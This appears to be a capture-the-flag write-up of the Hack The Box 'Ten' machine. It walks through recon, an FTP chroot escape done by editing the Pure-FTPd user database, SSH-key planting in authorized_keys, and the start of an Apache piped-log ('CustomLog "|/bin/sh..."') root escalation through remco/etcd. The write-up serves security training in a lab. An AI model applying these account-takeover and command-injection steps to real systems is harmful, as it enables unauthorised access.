---
title: Ten
date: 2026-02-24
ShowToc: true
draft: false
TocOpen: true
tags:
  - blog
  - HTB
  - web-exploit-ftp-usercreate-misconfig
  - FTP-to-SSH
  - Linux
  - hard
  - Linux-Privilege-Escalation-Apache-Remco/Etcd-Pipeline
lastmod: 2026-02-28T07:51:00.303Z
---
# Box Info

{{< htb-info "https://www.hackthebox.com/machines/ten" >}}

***

# Shell as tyrell

### PORT & IP SCAN

The `nmap` reveal that the machine is Linux a standard web server with the 21 , 22 ,80 port

```
Starting Nmap 7.98 ( https://nmap.org ) at 2026-02-25 10:20 -0500
Nmap scan report for 10.129.234.158
Host is up (0.20s latency).

PORT   STATE SERVICE VERSION
21/tcp open  ftp     Pure-FTPd
22/tcp open  ssh     OpenSSH 8.9p1 Ubuntu 3ubuntu0.13 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   256 13:98:54:52:d3:7b:ae:32:6a:33:6f:18:a3:5a:27:66 (ECDSA)
|_  256 2e:d5:86:25:c1:6b:0e:51:a2:2a:dd:82:44:a6:00:63 (ED25519)
80/tcp open  http    Apache httpd 2.4.52 ((Ubuntu))
|_http-server-header: Apache/2.4.52 (Ubuntu)
|_http-title: Page moved.
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 76.46 seconds

```

### FTP 21

Try the `anonymous` : `anonymous` , and we don't successful login

```
Connected to 10.129.234.158.
220---------- Welcome to Pure-FTPd [privsep] [TLS] ----------
220-You are user number 1 of 50 allowed.
220-Local time is now 15:23. Server port: 21.
220-This is a private system - No anonymous login
220-IPv6 connections are also welcome on this server.
220 You will be disconnected after 15 minutes of inactivity.
Name (10.129.234.158:root): anonymous
331 User anonymous OK. Password required
Password: 
530 Login authentication failed
ftp: Login failed
ftp> exit
221-Goodbye. You uploaded 0 and downloaded 0 kbytes.
221 Logout.
```

***

### Web Recon 80

### WebSite Directory BurteForce

The `feroxbuster` with the `-x php` shows that there are `info.php `, `attribution.php`,`/dist/`

```java
  Ten feroxbuster -u http://10.129.234.158  -x .php
                                                                                                                                                                                                                                            
 ___  ___  __   __     __      __         __   ___
|__  |__  |__) |__) | /  `    /  \ \_/ | |  \ |__
|    |___ |  \ |  \ | \__,    \__/ / \ | |__/ |___
by Ben "epi" Risher 🤓                 ver: 2.13.1
───────────────────────────┬──────────────────────
 🎯  Target Url            │ http://10.129.234.158/
 🚩  In-Scope Url          │ 10.129.234.158
 🚀  Threads               │ 50
 📖  Wordlist              │ /usr/share/seclists/Discovery/Web-Content/raft-medium-directories.txt
 👌  Status Codes          │ All Status Codes!
 💥  Timeout (secs)        │ 7
 🦡  User-Agent            │ feroxbuster/2.13.1
 💉  Config File           │ /etc/feroxbuster/ferox-config.toml
 🔎  Extract Links         │ true
 💲  Extensions            │ [php]
 🏁  HTTP methods          │ [GET]
 🔃  Recursion Depth       │ 4
───────────────────────────┴──────────────────────
 🏁  Press [ENTER] to use the Scan Management Menu™
──────────────────────────────────────────────────
403      GET        9l       28w      279c Auto-filtering found 404-like response and created new filter; toggle off with --dont-filter
404      GET        9l       31w      276c Auto-filtering found 404-like response and created new filter; toggle off with --dont-filter
200      GET      113l      404w     5131c http://10.129.234.158/index.php
200      GET        9l       25w      205c http://10.129.234.158/
200      GET       78l      226w     4525c http://10.129.234.158/attribution.php
200      GET       97l      297w     4050c http://10.129.234.158/signup.php
200      GET       90l      402w    39588c http://10.129.234.158/dist/img/caffeine-coffee-cup-6347.jpg
200      GET        7l      971w    76855c http://10.129.234.158/dist/js/bootstrap.bundle.min.js
200      GET        7l     1966w   155758c http://10.129.234.158/dist/css/bootstrap.min.css
200      GET     1169l     5839w   651702c http://10.129.234.158/dist/img/ai-codes-coding-97077.jpg
200      GET      844l     4357w    74325c http://10.129.234.158/info.php
200      GET       90l      208w     1632c http://10.129.234.158/carousel.css
200      GET       81l      464w    44565c http://10.129.234.158/dist/img/cyber-security-cybersecurity-device-60504.jpg
200      GET      127l      339w    23825c http://10.129.234.158/dist/img/donkey-ddos.jpg
200      GET      133l      601w    58305c http://10.129.234.158/dist/img/art-bright-card-1749900.jpg
200      GET      130l      754w    81244c http://10.129.234.158/dist/img/black-and-white-computer-device-163017.jpg
200      GET      221l     1367w   147808c http://10.129.234.158/dist/img/abstract-ai-art-373543.jpg
200      GET      199l     1208w   122095c http://10.129.234.158/dist/img/account-calculate-calculating-220301.jpg
302      GET        1l        8w       76c http://10.129.234.158/get-credentials-please-do-not-spam-this-thanks.php => http://10.129.234.158/signup.php
200      GET      879l     4746w   402071c http://10.129.234.158/dist/img/abstract-architecture-attractive-988873.jpg
200      GET      952l     5029w   527530c http://10.129.234.158/dist/img/business-code-coding-943096.jpg
200      GET     1408l     6105w   617689c http://10.129.234.158/dist/img/ai-artificial-intelligence-codes-247791.jpg
301      GET        9l       28w      315c http://10.129.234.158/dist => http://10.129.234.158/dist/
[####################] - 2m     60090/60090   0s      found:21      errors:4      
[####################] - 2m     60000/60000   562/s   http://10.129.234.158/ 
[####################] - 3s     60000/60000   20436/s http://10.129.234.158/dist/ => Directory listing (add --scan-dir-listings to scan)
[####################] - 3s     60000/60000   20387/s http://10.129.234.158/dist/css/ => Directory listing (add --scan-dir-listings to scan)
[####################] - 4s     60000/60000   14892/s http://10.129.234.158/dist/img/ => Directory listing (add --scan-dir-listings to scan)
[####################] - 0s     60000/60000   392157/s http://10.129.234.158/dist/js/ => Directory listing (add --scan-dir-listings to scan)     
```

http://10.129.234.158/info.php\
Finding one  , the `Info.php` show the base info to us which\
![Pasted image 20260226000508.png](/ob/Pasted%20image%2020260226000508.png)

The `attribution.php` dont have the LFI exploit\
http://10.129.234.158/attribution.php\
![Pasted image 20260226000610.png](/ob/Pasted%20image%2020260226000610.png)

{{< toggle "Tag 🏷️" >}}

{{< tag "web-exploit-ftp-usercreate-misconfig" >}} The function of the php is allow to create the useer domain and password , we found the FTP database website which contain the FTP user who 's access right by ffuf domain brute-force , so we can edit the user limit path to unlimit path in FTP ( ./ --> ../ )

{{< /toggle >}}

The `signup.php` page allows us to register a "Personal Domain." Submitting a domain name (e.g., `test`) provisions a set of FTP credentials (e.g., `ten-1c6c55ad` / `password`). The application notes that the personal domain will be available at `test.ten.vl`.

![Pasted image 20260226000826.png](/ob/Pasted%20image%2020260226000826.png)

Noted that there is the Personal Domain is created , so we can guess that there ae no only one of the  domain ; therefore , we will do the domain brute force .

![Pasted image 20260226000842.png](/ob/Pasted%20image%2020260226000842.png)

![Pasted image 20260226001053.png](/ob/Pasted%20image%2020260226001053.png)

### DNS enum

Realizing the application utilizes virtual routing, we use `ffuf` to brute-force subdomains against the `ten.vl` host:

Use the `ffuf` to find the webdb domain , so we add into the `etc/hosts`

```
➜  Ten ffuf -u http://10.129.234.158/  -H "Host: FUZZ.ten.vl" -w /opt/payloads/SecLists/Discovery/DNS/subdomains-top1million-20000.txt -ac

        /'___\  /'___\           /'___\       
       /\ \__/ /\ \__/  __  __  /\ \__/       
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\      
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/      
         \ \_\   \ \_\  \ \____/  \ \_\       
          \/_/    \/_/   \/___/    \/_/       

       v2.1.0-dev
________________________________________________

 :: Method           : GET
 :: URL              : http://10.129.234.158/
 :: Wordlist         : FUZZ: /opt/payloads/SecLists/Discovery/DNS/subdomains-top1million-20000.txt
 :: Header           : Host: FUZZ.ten.vl
 :: Follow redirects : false
 :: Calibration      : true
 :: Timeout          : 10
 :: Threads          : 40
 :: Matcher          : Response status: 200-299,301,302,307,401,403,405,500
________________________________________________

webdb                   [Status: 200, Size: 1685, Words: 55, Lines: 14, Duration: 108ms]
:: Progress: [20000/20000] :: Job [1/1] :: 689 req/sec :: Duration: [0:00:39] :: Errors: 0 ::

```

```
Ten cat /etc/hosts     
127.0.0.1       localhost
127.0.1.1       kali
::1             localhost ip6-localhost ip6-loopback
ff02::1         ip6-allnodes
ff02::2         ip6-allrouters
10.129.234.158  ten.vl test.ten.vl webdb.ten.vl 
➜  Ten ping -c 1 webdb.ten.vl              
PING ten.vl (10.129.234.158) 56(84) bytes of data.
64 bytes from ten.vl (10.129.234.158): icmp_seq=1 ttl=63 time=79.2 ms

--- ten.vl ping statistics ---
1 packets transmitted, 1 received, 0% packet loss, time 0ms
rtt min/avg/max/mdev = 79.151/79.151/79.151/0.000 ms
➜  Ten 
```

We dont know the username and the password , but there is the function for `Guess Credentials`

### FTP web Database

![Pasted image 20260226001320.png](/ob/Pasted%20image%2020260226001320.png)

![Pasted image 20260226212454.png](/ob/Pasted%20image%2020260226212454.png)

Reveals that the username and password is `user` : `pa55w0rd`\
![Pasted image 20260226212514.png](/ob/Pasted%20image%2020260226212514.png)

There is the database for pureftpd which look like the ftp user control\
![Pasted image 20260226212616.png](/ob/Pasted%20image%2020260226212616.png)

By default, the FTP application locks our provisioned user (`ten-1c6c55ad`) into a specific directory (`/srv/ten-1c6c55ad/./`). By modifying the directory path in the database to `/` or appending `../`, we successfully escape the FTP chroot jail and gain read access to the entire Linux filesystem.

![Pasted image 20260226213016.png](/ob/Pasted%20image%2020260226213016.png)

![Pasted image 20260226212948.png](/ob/Pasted%20image%2020260226212948.png)

we will try to make the change the directory to make the go around in the FTP

![Pasted image 20260226213312.png](/ob/Pasted%20image%2020260226213312.png)

we edit the path from the `./` to `../` for example , we are in the `/home/kali/ftp/.` which set we cannot go back or go around , but after we change , we can go everywhere\
![Pasted image 20260226213453.png](/ob/Pasted%20image%2020260226213453.png)

now i can view all directory

```
➜  Ten ftp ten-1c6c55ad@10.129.234.158
Connected to 10.129.234.158.
220---------- Welcome to Pure-FTPd [privsep] [TLS] ----------
220-You are user number 1 of 50 allowed.
220-Local time is now 13:35. Server port: 21.
220-This is a private system - No anonymous login
220-IPv6 connections are also welcome on this server.
220 You will be disconnected after 15 minutes of inactivity.
331 User ten-1c6c55ad OK. Password required
Password: 
230 OK. Current directory is /srv
Remote system type is UNIX.
Using binary mode to transfer files.
ftp> cd ..
250 OK. Current directory is /
ftp> ls
229 Extended Passive mode OK (|||46722|)
150 Accepted data connection
lrwxrwxrwx    1 0          root                7 Feb 16  2024 bin -> usr/bin
drwxr-xr-x    4 0          root             4096 Jun 24  2025 boot
dr-xr-xr-x    2 0          root             4096 Jul  2  2025 cdrom
drwxr-xr-x   19 0          root             4000 Feb 25 14:21 dev
drwxr-xr-x  107 0          root             4096 Jul  2  2025 etc
drwxr-xr-x    3 0          root             4096 Sep 28  2024 home
lrwxrwxrwx    1 0          root                7 Feb 16  2024 lib -> usr/lib
lrwxrwxrwx    1 0          root                9 Feb 16  2024 lib32 -> usr/lib32
lrwxrwxrwx    1 0          root                9 Feb 16  2024 lib64 -> usr/lib64
lrwxrwxrwx    1 0          root               10 Feb 16  2024 libx32 -> usr/libx32
drwx------    2 0          root            16384 Sep 28  2024 lost+found
drwxr-xr-x    2 0          root             4096 Feb 16  2024 media
drwxr-xr-x    2 0          root             4096 Feb 16  2024 mnt
drwxr-xr-x    3 0          root             4096 Sep 28  2024 opt
dr-xr-xr-x  292 0          root                0 Feb 25 14:21 proc
drwx------    7 0          root             4096 Jul  2  2025 root
drwxr-xr-x   35 0          root             1040 Feb 26 01:25 run
lrwxrwxrwx    1 0          root                8 Feb 16  2024 sbin -> usr/sbin
drwxr-xr-x    6 0          root             4096 Feb 16  2024 snap
drwxr-xr-x    3 54128      54128            4096 Feb 26 13:35 srv
dr-xr-xr-x   13 0          root                0 Feb 25 14:21 sys
drwxrwxrwt   15 0          root             4096 Feb 26 13:29 tmp
drwxr-xr-x   14 0          root             4096 Feb 16  2024 usr
drwxr-xr-x   14 0          root             4096 Sep 28  2024 var
226-Options: -l 
226 24 matches total
ftp> pwd
Remote directory: /
ftp> 

```

Browsing the filesystem via FTP, we identify the local user `tyrell`. However, navigating to `/home/tyrell` throws a "Permission denied" error because our FTP user lacks the underlying OS read privileges.

```
150 Accepted data connection
drwxr-x---    4 1000       tyrell           4096 Jun 24  2025 tyrell
226-Options: -l 
226 1 matches total
ftp> cd tyrell
550 Can't change directory to tyrell: Permission denied
ftp> 
```

To bypass this, we return to the WebDB interface and make two critical changes to our FTP user's record:

**Change the UID** to `1000` (matching `tyrell`'s user ID).

**Change the target directory** explicitly to `/home/tyrell/.ssh`.

![Pasted image 20260226215307.png](/ob/Pasted%20image%2020260226215307.png)

```
ftp> ls -al
229 Extended Passive mode OK (|||36711|)
150 Accepted data connection
drwxr-x---    4 1000       tyrell           4096 Jun 24  2025 .
drwxr-xr-x    3 0          root             4096 Sep 28  2024 ..
lrwxrwxrwx    1 0          root                9 Jun 24  2025 .bash_history -> /dev/null
-rw-r--r--    1 1000       tyrell            220 Jan  6  2022 .bash_logout
-rw-r--r--    1 1000       tyrell           3771 Jan  6  2022 .bashrc
drwx------    2 1000       tyrell           4096 Sep 28  2024 .cache
-rw-r--r--    1 1000       tyrell            807 Jan  6  2022 .profile
drwx------    2 1000       tyrell           4096 Sep 28  2024 .ssh
-r--------    1 1000       tyrell             33 Apr 11  2025 .user.txt
226-Options: -a -l 
226 9 matches total
ftp> pwd
Remote directory: /home/tyrell
ftp> 

```

I can’t `cd` into `.ssh`. There seems to be a block on anything that starts with `.`. But what if I try setting the base directory to `/home/tyrell/.ssh`? It works in the web DB UI:

![Pasted image 20260227175436.png](/ob/Pasted%20image%2020260227175436.png)

```
➜  Ten ftp ten-1c6c55ad@10.129.234.158
Connected to 10.129.234.158.
220---------- Welcome to Pure-FTPd [privsep] [TLS] ----------
220-You are user number 1 of 50 allowed.
220-Local time is now 14:00. Server port: 21.
220-This is a private system - No anonymous login
220-IPv6 connections are also welcome on this server.
220 You will be disconnected after 15 minutes of inactivity.
331 User ten-1c6c55ad OK. Password required
Password: 
230 OK. Current directory is /
Remote system type is UNIX.
Using binary mode to transfer files.
ftp> dir
229 Extended Passive mode OK (|||38659|)
150 Accepted data connection
-rw-------    1 1000       tyrell            162 Sep 28  2024 authorized_keys
226-Options: -l 
226 1 matches total
ftp> 

```

### FTP to SSH

{{< toggle "Tag 🏷️" >}}

{{< tag "FTP-to-SSH" >}} We have the user in FTP , next we will create the ssh key to use the FTP put function to the ./ssh to allow the user login

{{< /toggle >}}

Dropping directly into the `.ssh` folder as UID 1000 bypasses the parent directory's read restrictions. We generate a local Ed25519 SSH key pair and use our FTP access to upload the public key directly to `tyrell`'s `authorized_keys` file.

Create the ssh key

```
➜  Ten ssh-keygen -t ed25519 -C "haydon@kali-$(date +%Y%m%d)"
Generating public/private ed25519 key pair.
Enter file in which to save the key (/root/.ssh/id_ed25519): yes
Enter passphrase for "yes" (empty for no passphrase): 
Enter same passphrase again: 
Your identification has been saved in yes
Your public key has been saved in yes.pub
The key fingerprint is:
SHA256:UDTg4QPSW2Fvn45C08GGluJr0suKoC/ZyOEdb62YDw4 haydon@kali-20260226
The key's randomart image is:
+--[ED25519 256]--+
|  ... =++        |
|   ..=.B .       |
|    .oO *        |
|   ..o * o .     |
|    . o S o      |
| . o o . o       |
|+E+.* o . .      |
|*++=++ o         |
|ooo==o.          |
+----[SHA256]-----+ 
➜  Ten cd ~/.ssh/ 
```

Go to the ssh folder

```
➜  Ten cd ~/.ssh/ 
➜  .ssh ls    
agent  id_ed25519  id_ed25519.pub

```

upload the authorized\_keys by ftp

```
➜  .ssh ftp ten-1c6c55ad@10.129.234.158

Connected to 10.129.234.158.
220---------- Welcome to Pure-FTPd [privsep] [TLS] ----------
220-You are user number 2 of 50 allowed.
220-Local time is now 14:02. Server port: 21.
220-This is a private system - No anonymous login
220-IPv6 connections are also welcome on this server.
220 You will be disconnected after 15 minutes of inactivity.
331 User ten-1c6c55ad OK. Password required
Password: 
230 OK. Current directory is /
Remote system type is UNIX.
Using binary mode to transfer files.
ftp> put /root/.ssh/id_ed25519.pub authorized_keys
local: /root/.ssh/id_ed25519.pub remote: authorized_keys
229 Extended Passive mode OK (|||3998|)
150 Accepted data connection
100% |***********************************************************************|   102      743.35 KiB/s    00:00 ETA
226-File successfully transferred
226 0.206 seconds (measured here), 494.50 bytes per second
102 bytes sent in 00:00 (0.29 KiB/s)
ftp> 
```

login by ssh

```java
➜  .ssh ssh -i /root/.ssh/id_ed25519  tyrell@ten.vl 

The authenticity of host 'ten.vl (10.129.234.158)' can't be established.
ED25519 key fingerprint is: SHA256:l6yrcdMcU34GxTUYFlSibADXTv2/Bd1AEnItyyI0jdg
This key is not known by any other names.
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added 'ten.vl' (ED25519) to the list of known hosts.

 System information as of Thu Feb 26 02:07:46 PM UTC 2026

  System load:  0.0               Processes:             240
  Usage of /:   71.9% of 8.07GB   Users logged in:       0
  Memory usage: 15%               IPv4 address for eth0: 10.129.234.158
  Swap usage:   0%
tyrell@ten:~$ 

```

```java
➜  .ssh ssh -i /root/.ssh/id_ed25519  tyrell@ten.vl 

The authenticity of host 'ten.vl (10.129.234.158)' can't be established.
ED25519 key fingerprint is: SHA256:l6yrcdMcU34GxTUYFlSibADXTv2/Bd1AEnItyyI0jdg
This key is not known by any other names.
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added 'ten.vl' (ED25519) to the list of known hosts.

 System information as of Thu Feb 26 02:07:46 PM UTC 2026

  System load:  0.0               Processes:             240
  Usage of /:   71.9% of 8.07GB   Users logged in:       0
  Memory usage: 15%               IPv4 address for eth0: 10.129.234.158
  Swap usage:   0%
tyrell@ten:~$ ls
tyrell@ten:~$ cd ..
tyrell@ten:/home$ cd /
tyrell@ten:/$ ls
bin   cdrom  etc   lib    lib64   lost+found  mnt  proc  run   snap  sys  usr
boot  dev    home  lib32  libx32  media       opt  root  sbin  srv   tmp  var
tyrell@ten:/$ cd home
tyrell@ten:/home$ ls
tyrell
tyrell@ten:/home$ cd tyrell
tyrell@ten:~$ ls
tyrell@ten:~$ ls -a
.  ..  .bash_history  .bash_logout  .bashrc  .cache  .profile  .ssh  .user.txt
tyrell@ten:~$ cat .user.txt
a0a255ad63b7a26d83467fa6e0a6a757
tyrell@ten:~$ 

```

***

# Shell as ROOT

{{< toggle "Tag 🏷️" >}}

{{< tag "Linux-Privilege-Escalation-Apache-Remco/Etcd-Pipeline" >}} misconfiguration where dynamically generated infrastructure (`remco` + `etcd`) trusts user-controlled input, leading to code execution via Apache's piped log functionality.

{{< /toggle >}}

### 1. Linux Enum

Run the `ps auxxxxxxxx` command to find that the running service is `apache`, `mariadbd` ,`pure-ftpd` , `remco`, `_Laurel_` , `node` , and i will check where is the config path

1. apache : /etc/apache2/apache2.conf
2. mariadbd : /etc/mysql/my.cnf
3. pure-ftpd : /etc/pure-ftpd/conf/
4. remco : /etc/remco/config
5. Laurel\_ : /etc/laurel/

```
root         378  0.0  0.0      0     0 ?        I<   08:32   0:00 [kdmflush]
root         404  0.0  0.0      0     0 ?        I<   08:32   0:00 [raid5wq]
root         452  0.0  0.0      0     0 ?        S    08:32   0:00 [jbd2/dm-0-8]
root         453  0.0  0.0      0     0 ?        I<   08:32   0:00 [ext4-rsv-conver]
root         513  0.0  1.6 128264 65984 ?        S<s  08:32   0:04 /lib/systemd/systemd-journald
root         543  0.0  0.0      0     0 ?        I<   08:32   0:00 [kaluad]
root         545  0.0  0.0      0     0 ?        I<   08:32   0:00 [kmpath_rdacd]
root         549  0.0  0.0      0     0 ?        I<   08:32   0:00 [kmpathd]
root         550  0.0  0.0      0     0 ?        I<   08:32   0:00 [kmpath_handlerd]
root         552  0.0  0.6 289468 27248 ?        SLsl 08:32   0:00 /sbin/multipathd -d -s
root         553  0.0  0.1  26436  7176 ?        Ss   08:32   0:00 /lib/systemd/systemd-udevd
root         728  0.0  0.0      0     0 ?        S    08:32   0:00 [jbd2/sda2-8]
root         729  0.0  0.0      0     0 ?        I<   08:32   0:00 [ext4-rsv-conver]
systemd+     749  0.0  0.3  28048 15848 ?        Ss   08:32   0:00 /lib/systemd/systemd-resolved
systemd+     750  0.0  0.1  89364  6664 ?        Ssl  08:32   0:00 /lib/systemd/systemd-timesyncd
root         751  0.0  0.0  85264  2444 ?        S<sl 08:32   0:01 /sbin/auditd
_laurel      754  0.0  0.1   9960  6036 ?        S<   08:32   0:01 /usr/local/sbin/laurel --config /etc/laurel/config.toml
root         778  0.0  0.2  51148 11772 ?        Ss   08:32   0:00 /usr/bin/VGAuthService
root         785  0.1  0.2 241404  9252 ?        Ssl  08:32   0:07 /usr/bin/vmtoolsd
root         792  0.0  0.0      0     0 ?        S    08:32   0:00 [audit_prune_tre]
root         809  0.0  0.1 101244  6108 ?        Ssl  08:32   0:00 /sbin/dhclient -1 -4 -v -i -pf /run/dhclient.eth0.pid -lf /var/li
root         957  0.0  0.0   6896  2876 ?        Ss   08:32   0:00 /usr/sbin/cron -f -P
message+     958  0.0  0.1   8880  4888 ?        Ss   08:32   0:00 @dbus-daemon --system --address=systemd: --nofork --nopidfile --s
root         976  0.0  0.0   8568  2020 ?        Ss   08:32   0:00 /usr/sbin/inetd
root         977  0.0  0.0  82832  3852 ?        Ssl  08:32   0:00 /usr/sbin/irqbalance --foreground
root         980  0.0  0.4  32720 19788 ?        Ss   08:32   0:00 /usr/bin/python3 /usr/bin/networkd-dispatcher --run-startup-trigg
root         983  0.0  0.1 234504  6852 ?        Ssl  08:32   0:00 /usr/libexec/polkitd --no-debug
root         986  0.0  0.6 733880 24488 ?        Ssl  08:32   0:02 /usr/local/sbin/remco
syslog       987  0.0  0.1 222404  5996 ?        Ssl  08:32   0:00 /usr/sbin/rsyslogd -n -iNONE
root         992  0.0  0.9 1848388 36392 ?       Ssl  08:32   0:05 /usr/lib/snapd/snapd
root         994  0.0  0.1  15540  7452 ?        Ss   08:32   0:00 /lib/systemd/systemd-logind
root         999  0.0  0.3 392704 12600 ?        Ssl  08:32   0:00 /usr/libexec/udisks2/udisksd
root        1006  0.0  1.1 1802508 46860 ?       Ssl  08:32   0:04 /usr/bin/containerd
root        1057  0.0  0.0   6176  1160 tty1     Ss+  08:32   0:00 /sbin/agetty -o -p -- \u --noclear tty1 linux
root        1077  0.0  0.2  15436  9316 ?        Ss   08:32   0:00 sshd: /usr/sbin/sshd -D [listener] 0 of 10-100 startups
root        1102  0.0  0.3 244236 12076 ?        Ssl  08:32   0:00 /usr/sbin/ModemManager
root        1129  0.0  0.0  22900  2904 ?        Ss   08:32   0:00 pure-ftpd (SERVER)
root        1183  0.0  1.8 2340736 74920 ?       Ssl  08:32   0:04 /usr/bin/dockerd -H fd:// --containerd=/run/containerd/containerd
root        1532  0.0  0.3 1238360 13088 ?       Sl   08:32   0:00 /usr/bin/containerd-shim-runc-v2 -namespace moby -id f78bd1e38399
root        1538  0.0  0.3 1238360 13388 ?       Sl   08:32   0:00 /usr/bin/containerd-shim-runc-v2 -namespace moby -id 9d8fee3b1412
lxd         1577  0.0  2.8 1539004 112904 ?      Ssl  08:32   0:01 mariadbd
root        1587  0.7  1.0 11736652 42376 ?      Ssl  08:32   0:47 /usr/local/bin/etcd --name=etcd --listen-client-urls=http://0.0.0
root        1666  0.0  0.0 1671548 3620 ?        Sl   08:32   0:00 /usr/bin/docker-proxy -proto tcp -host-ip 127.0.0.1 -host-port 23
root        1672  0.0  0.0 1745280 3936 ?        Sl   08:32   0:00 /usr/bin/docker-proxy -proto tcp -host-ip 127.0.0.1 -host-port 23
root        1678  0.0  0.1 1745280 4028 ?        Sl   08:32   0:00 /usr/bin/docker-proxy -proto tcp -host-ip 127.0.0.1 -host-port 40
root        1715  0.0  0.1 1745280 4108 ?        Sl   08:32   0:00 /usr/bin/docker-proxy -proto tcp -host-ip 127.0.0.1 -host-port 33
root        1722  0.0  0.1 1671548 4120 ?        Sl   08:32   0:00 /usr/bin/docker-proxy -proto tcp -host-ip 127.0.0.1 -host-port 22
root        1756  0.0  0.3 1238104 13280 ?       Sl   08:32   0:00 /usr/bin/containerd-shim-runc-v2 -namespace moby -id 5f7eeec719ba
root        1785  0.0  2.4 11244588 96260 ?      Ssl  08:32   0:04 node src/index.js
root        2121  0.0  0.7 391008 31340 ?        Ssl  08:43   0:01 /usr/libexec/fwupd/fwupd
root        2126  0.0  0.2 239500  8052 ?        Ssl  08:43   0:00 /usr/libexec/upowerd
root        2630  0.0  0.0      0     0 ?        I    09:46   0:00 [kworker/u4:0-ext4-rsv-conversion]
root        2637  0.0  0.0      0     0 ?        I    09:46   0:00 [kworker/1:1-cgroup_destroy]
root        2742  0.0  0.2  16920 10760 ?        Ss   09:56   0:00 sshd: tyrell [priv]
tyrell      2745  0.0  0.2  17200 10076 ?        Ss   09:56   0:00 /lib/systemd/systemd --user
tyrell      2746  0.0  0.1 103996  4076 ?        S    09:56   0:00 (sd-pam)
tyrell      2768  0.0  0.1  17212  8004 ?        S    09:56   0:00 sshd: tyrell@pts/0
tyrell      2769  0.0  0.1   8656  5460 pts/0    Ss   09:56   0:00 -bash
root        2792  0.0  0.0      0     0 ?        I    09:58   0:00 [kworker/0:3-cgroup_destroy]
root        2806  0.0  0.0      0     0 ?        I    10:01   0:00 [kworker/u4:2-ext4-rsv-conversion]
root        2815  0.0  0.0      0     0 ?        I    10:03   0:00 [kworker/1:2-events]
root        2836  0.0  0.5 203592 20180 ?        Ss   10:04   0:00 /usr/sbin/apache2 -k start
www-data    2838  0.0  0.2 204148  9148 ?        S    10:04   0:00 /usr/sbin/apache2 -k start
www-data    2839  0.0  0.2 204148  9148 ?        S    10:04   0:00 /usr/sbin/apache2 -k start
www-data    2840  0.0  0.2 204148  9148 ?        S    10:04   0:00 /usr/sbin/apache2 -k start
www-data    2841  0.0  0.2 204148  9148 ?        S    10:04   0:00 /usr/sbin/apache2 -k start
www-data    2842  0.0  0.2 204148  9148 ?        S    10:04   0:00 /usr/sbin/apache2 -k start
root        2843  0.0  0.2  17220 10920 ?        Ss   10:04   0:00 sshd: root@pts/1
root        2852  0.0  0.2  17200  9880 ?        Ss   10:04   0:00 /lib/systemd/systemd --user
root        2853  0.0  0.1 104012  4104 ?        S    10:04   0:00 (sd-pam)
root        2874  0.0  0.1   8656  5440 pts/1    Ss+  10:04   0:00 -bash
root        2883  0.0  0.0      0     0 ?        I    10:04   0:00 [kworker/0:0-cgroup_destroy]
root        2899  0.0  0.0      0     0 ?        I    10:08   0:00 [kworker/u4:1-events_unbound]
root        2950  0.0  0.0      0     0 ?        I    10:09   0:00 [kworker/1:0-cgroup_destroy]
root        2960  0.0  0.0      0     0 ?        I    10:10   0:00 [kworker/0:1-events]
root        2967  0.0  0.0      0     0 ?        I    10:11   0:00 [kworker/0:2-events]
tyrell      2988  0.0  0.0  10072  1608 pts/0    R+   10:13   0:00 ps auxxxxxxx

```

### 2. Apache Enum

{{< toggle "Tag 🏷️" >}}

{{< tag "Apache Enum" >}} list the Apache every file and folder function for the finding the misconfig , for example , found the sites-enabled folder 's one of the file is the path injection

{{< /toggle >}}

![Pasted image 20260227182518.png](/ob/Pasted%20image%2020260227182518.png)

`apache2.conf`

The main engine block. This is the primary configuration file that dictates global settings for the server and explicitly tells Apache to load all the other directories and files in this list.

* N/A

`ports.conf`

Dedicated entirely to defining which IP addresses and TCP ports Apache listens on (e.g., `Listen 80`, `Listen 443`).

* N/A

`envvars`

A shell script containing environment variables used by the Apache process. Crucially, this is where the Apache runtime user and group (usually `www-data`) are defined.

* N/A

`magic`

Contains instructions and "magic numbers" used by the `mod_mime_magic` module to determine the MIME type of a file based on its actual content, rather than just relying on its file extension.

* N/A

`sites-available`

Stores the configuration files for every Virtual Host. Just because a file is here doesn't mean Apache is using it.

* N/A

`sites-enabled`

Contains symlinks pointing to the active virtual hosts in `sites-available`. Apache only reads virtual host configurations that are linked in this folder.

* **Attacker Exploitation:**  Because of the remco misconfig so attackers guarantee their malicious directives (like `CustomLog "|/bin/sh..."`)

`mods-available`

Stores the configuration (`.conf`) and loading directives (`.load`) for all installed Apache modules (like PHP, SSL, or rewrite modules).

* N/A

`mods-enabled`

Contains symlinks pointing to `mods-available`. Only the modules linked here are actively loaded into the web server's memory.

* N/A

`conf-available`

Holds generic, global configuration snippets that apply to the whole server rather than a specific site or module.

* N/A

`conf-enabled`

Contains symlinks pointing to `conf-available`. Only the global configurations linked here are applied by Apache.

* N/A

etcd (pronounced "et-see-dee") is an open-source, distributed key-value store designed specifically for reliably storing and managing small amounts of critical data in distributed systems (like clusters of servers or containers).

here is the 3 file , `000-default.conf`  `001-webdb.conf`  `010-customers.conf`

```shell
tyrell@ten:/etc/apache2/sites-enabled$ ls
000-default.conf  001-webdb.conf  010-customers.conf
```

`000-default.conf` simply hosts the files in `/var/www/html`:

```
<VirtualHost *:80>
        ServerAdmin webmaster@ten.vl
        DocumentRoot /var/www/html
</VirtualHost>
```

`001-webdb.conf` forwards traffic to that virtual host to localhost port 22071, which is the webdb instance:

```
<VirtualHost *:80>
        ServerAdmin webmaster@ten.vl
        ServerName webdb.ten.vl
        ProxyPass "/"  "http://127.0.0.1:22071/"
        ProxyPassReverse "/"  "http://127.0.0.1:22071/"
</VirtualHost>
```

`010-customers.conf` has an entry for each site I’ve registered:

```
<VirtualHost *:80>
        ServerName asdasd.ten.vl
        DocumentRoot /srv/ten-13e92a74/
</VirtualHost>


<VirtualHost *:80>
        ServerName oxdf.ten.vl
        DocumentRoot /srv/ten-299467c0/
</VirtualHost>


<VirtualHost *:80>                             
        ServerName 0xdf.ten.vl                                                                
        DocumentRoot /srv/ten-6c7a27a3/                                                       
</VirtualHost>    


<VirtualHost *:80>
        ServerName oxdf.ten.vl                                                                
        DocumentRoot /srv/ten-9a28ba33/
</VirtualHost> 
...[snip]...
```

